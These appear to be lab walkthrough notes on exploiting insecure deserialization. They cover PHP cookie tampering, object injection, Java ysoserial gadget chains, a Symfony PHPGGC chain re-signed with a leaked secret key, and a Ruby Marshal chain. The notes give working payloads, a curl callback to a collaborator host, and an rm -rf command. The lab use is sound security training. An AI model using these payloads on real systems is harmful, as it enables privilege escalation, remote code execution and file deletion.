# Navigation Menu
- [Modifying serialized objects](#modifying-serialized-objects)
- [Modified serialized data type](#modified-serialized-data-type)
- [Using application functionality to exploit insecure deserialization](#using-application-functionality-to-exploit-insecure-deserialization)
- [Arbitrary object injection in PHP](#arbitrary-object-injection-in-php)
- [Exploiting Java deserialisation with Apache Commons](#exploiting-java-deserialisation-with-apache-commons)
- [Exploiting PHP deserialization with a pre-built gadget chain](#exploiting-php-deserialization-with-a-pre-built-gadget-chain)
- [Exploiting Ruby deserialization using a documented gadget chain](#exploiting-ruby-deserialization-using-a-documented-gadget-chain)
# Modifying serialized objects
- Login as admin
1. Authenticate as Wiener
2. Login sets a cookie which is a Base64 encoded PHP serialised object
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
- We can determine the following
	- Object called "User" with two attributes: "username" and "admin"
	- Admin attribute has a Boolean value 0 or 1
3. Change the serialised object and set "admin" value to 1
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
4. Base64 encode the payload above > Replace your cookie in the browser tools
5. Refresh the page and you have Administrator access
- Note: You can also change the serialised object and change your name to Administrator and take over their account
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:5:"admin";b:1;}
```
# Modified serialized data type
- Login as admin
1. Authenticate as Wiener
2. Login sets a cookie which is a Base64 encoded PHP serialised object
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"y4uq0uh4pxnawwvppzp7jkidgebzomxy";}
```
- There is an "access_token" which is provided as a string
- We can test the loose string comparisons of PHP and see if we can make it TRUE
3. Change the data type and value of "access_token" to be a boolean and set it to TRUE
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
```
4. Base64 encode the above object > Place in browser cookie
5. Refresh page and you have admin access
6. Note:
	1. We can also change the data type to be an integer and make its value `0` which equals TRUE because the PHP is doing a loose comparison and the actual access token which is a string (treated as an integer of `0`) against an integer with a value of `0` which looks like `"accessToken" == 0` which will equal TRUE
	2. This only works on PHP 7.x and earlier
# Using application functionality to exploit insecure deserialization
- Delete `morale.txt` from Carlos's home directory
1. Login to as Gregg
2. Observe the following serialised object is created
```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"wmqpe96w5szgsv32maodo4yaxdo3ak0e";s:11:"avatar_link";s:18:"users/gregg/avatar";}
```
- Notice that there is an "avatar_link" which points to a filesystem that is our avatar
3. On the account page there is a delete profile link which will delete our account
4. Change the avatar link to be the file `morale.txt` in Carlos' home directory
```php
O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"wmqpe96w5szgsv32maodo4yaxdo3ak0e";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```
5. Base64 encode > Replace session cookie in browser and refresh page
6. Delete profile
# Arbitrary object injection in PHP
- Delete `morale.txt` from Carlos' home directory
1. Login to page
2. HTTP response contains the following HTML comment
```html
</div>
</section>
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
</div>
```
3. Viewing the page gives us no information in the HTTP response
4. Append a tilde and we can see more information. This works because the tilde is commonly used for backup files or copies of other files
```
GET /libs/CustomTemplate.php~
```
5. We get the following PHP code
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
- There is a lot to unpack lets go through the following
	1. There is a class created called "CustomTemplate" - We need to create our serialised object as this class (i.e. `O:14:"CustomTemplate"`)
		1. CustomTemplate has two private properties (`template_file_path` & `lock_file_path`)
	2. There are a 4 functions we can ignore because they are not important to us
	3. The last function `__destruct()` is important because it will run automatically at the end of this script AND it includes `unlink()` which will delete a file. The logic works based on that it will delete if the file specified in `lock_file_path` exists
6. Now we understand what to do. Craft a malicious serialised object
```
<@base64>O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}</@base64>
```
- We've done the following:
	- Changed the object to be `CustomTemplate`
	- Given it one attribute `lock_file_path`
	- Given the value to be Carlos' `morale.txt` file
# Exploiting Java deserialisation with Apache Commons
- Delete `morale.txt` from Carlos' home directory
1. Authenticate
2. Session cookie is serialised Java date (we can tell because of the tell tale sign `rO0`) in the start of the data
```
Set-Cookie: session=rO0ABXNyAC9sYWIuYWN0aW9ucy5jb21tb24uc2VyaWFsaXphYmxlLkFjY2Vzc1Rva2VuVXNlchlR/OUSJ6mBAgACTAALYWNjZXNzVG9rZW50ABJMamF2YS9sYW5nL1N0cmluZztMAAh1c2VybmFtZXEAfgABeHB0ACBzdGhneHV2a2s2dGJyc3JjYmoyNmt6bWl6OXU3YmRkYXQABndpZW5lcg%3d%3d; Secure; HttpOnly; SameSite=None
```
3. Knowing it is using Java serialisation, test a probe payload using the `URLDNS` payload
```sh
java -jar ysoserial-all.jar URLDNS "https://collaborator.com" | base64
```
4. Copy the payload and submit it via the cookie in Repeater
	1. You will receive `500 Internal Server Error` but that is completely ok
	2. Use Hackvertor to URL encode the payload easily
5. We get a hit in collaborator confirming we have an insecure deserialisation process
6. Go through the different payloads using the `CommonsCollectionsX` until you get a hit on collaborator
	1. Eventually we get a hit using `CommonsCollections2`
```sh
java -jar ysoserial-all.jar CommonsCollections2 "curl https://collaborator/common2" | base64
```
7. After confirming it is `CommonsCollections2`, change the payload to delete the Carlos' `morale.txt` file
```sh
java -jar ysoserial-all.jar CommonsCollections2 "rm -rf /home/carlos/morale.txt" | base64
```
# Exploiting PHP deserialization with a pre-built gadget chain
- Delete `morale.txt`
1. Authenticate
2. Identify serialised object in the cookie
```
%7B%22token%22%3A%22Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzZzdzYjAyYmhzNGR5MGpwZGEwNjMyaGhneHV5YzBlYSI7fQ%3D%3D%22%2C%22sig_hmac_sha1%22%3A%22940d6bdc284525e83036031488c1477ebf1f0606%22%7D
```
- Decodes to:
```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJzZzdzYjAyYmhzNGR5MGpwZGEwNjMyaGhneHV5YzBlYSI7fQ==","sig_hmac_sha1":"940d6bdc284525e83036031488c1477ebf1f0606"}
```
- We see a Base64 encoded payload and a SHA1SUM signature (this is important)
3. HTTP response also discloses `/cig-bin/phpinfo.php` as a file
	1. Accessing this in the browser gives us all the information including disabled functions and the SECRET_KEY
		1. Note the disabled functions and note down the SECRET_KEY
4. If we repeat a request that has deliberately broken the serialised object we get a 500 Internal Server Error and it also discloses the PHP framework information to us:
	1. `Internal Server Error: Symfony Version: 4.3.6`
5. Now we know the framework, search for and test one of the payloads using PHPGGC
```sh
./phpggc -l symfony # list payloads for symfony
./phpggc -f Symfony/RCE4 exec "sleep 5" # create sleep payload - we also know exec is not disabled on the server
```
6. Try submitting the serialised object (URL-encoded) and we get an error
```
Cookie: session=<@urlencode>a:2:{i:7;O:47:"Symfony\Component...<SNIP>...</@urlencode>
```
- The error is:
```
PHP Fatal error:  Uncaught Exception: Signature does not match session in /var/www/index.php:7
Stack trace:
#0 {main}
  thrown in /var/www/index.php on line 7
```
7. Recall that the original message has a Base64 encoded token and a "sig_hmac_sha1"
	1. This is making a signature of the Base64 encoded token likely
8. Create a PHP script that will generate a SHA1SUM of the Base64 encoded payload using the SECRET_KEY value taken from `phpinfo.php`
```php
<?php
$secretKey = 'SECRET_KEY';
$message = 'BASE64-PAYLOAD';
$hmacSha1 = hash_hmac('sha1', $message, $secretKey);
echo 'HMAC-SHA1: ' . $hmacSha1;
?>
```
9. Test the above script first with the Base64 token from the original serialised object and confirm that the SHA1SUM generated matches the serialised object
```sh
php sha1sum.php
# 940d6bdc284525e83036031
```
10. After confirming that we can now successfully sign serialised objects, try the `Symfony/RCE4` payload again. Make sure to Base64 encode it
```sh
./phpggc -f -b Symfony/RCE4 exec "sleep 5"
```
11. Repeat the process in step 8 and collect the SHA1SUM
12. Construct the serialised object
```
{"token":"BASE64-PAYLOAD","sig_hmac_sha1":"SHA1SUM"}
```
13. Confirm that the target sleeps for 5 seconds
14. Repeat the steps to execute the command to delete Carlos' `morale.txt`
# Exploiting Ruby deserialization using a documented gadget chain
- Delete `morale.txt`
1. Authenticating sets what looks like a base64 encoded cookie
2. Decoding as Base64 reveals some information (we can assume this is a serialised object)
3. Deleting half the cookie returns a `500 Internal Server Error`. There are two errors. One reveals no information and another returns a verbose error message
	1. Keep editing the cookie until you get a verbose error message
- We see the the following error:
```
index.rb:13:in `load&apos;: marshal data too short (ArgumentError)
	from -e:13:in `&lt;main&gt;&apos;
```
- We can assume this is using Ruby now
4. Google search for "Ruby Deserialisation Gadget Chain" takes us to this article - https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
5. Copy the final gadget chain from and go to an online compiler - https://www.jdoodle.com/execute-ruby-online
6. Comment the last two lines and print the payload using base64
```rb
# puts payload.inspect
# puts Marshal.load(payload)
require "base64"
puts Base64.encode64(payload)
```
7. Replace the command `id` with `sleep 5` on line 18
8. Run the compiler and copy the base64 output
9. Replace the session cookie with the serialised object and confirm the target has slept for 5 seconds
10. Change the payload to delete `morale.txt` and repeat the compiling process
